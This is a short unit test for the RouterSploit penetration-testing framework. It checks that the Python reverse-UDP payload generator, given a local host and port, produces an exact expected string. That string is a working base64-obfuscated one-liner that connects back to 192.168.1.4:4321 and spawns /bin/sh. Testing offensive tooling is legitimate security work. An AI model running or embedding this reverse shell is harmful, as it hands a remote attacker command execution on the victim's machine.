from routersploit.modules.payloads.cmd.python_reverse_udp import Payload


# python reverse udp payload with lhost=192.168.1.4 lport=4321
reverse_udp = (
    "python -c \"exec('aW1wb3J0IG9zCmltcG9ydCBwdHkKaW1wb3J0IHNvY2tldApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjEuNCcsNDMyMSkpCm9zLmR1cDIocy5maWxlbm8oKSwgMCkKb3MuZHVwMihzLmZpbGVubygpLCAxKQpvcy5kdXAyKHMuZmlsZW5vKCksIDIpCnB0eS5zcGF3bignL2Jpbi9zaCcpOwpzLmNsb3NlKCkK'.decode('base64'))\""
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.run() == reverse_udp
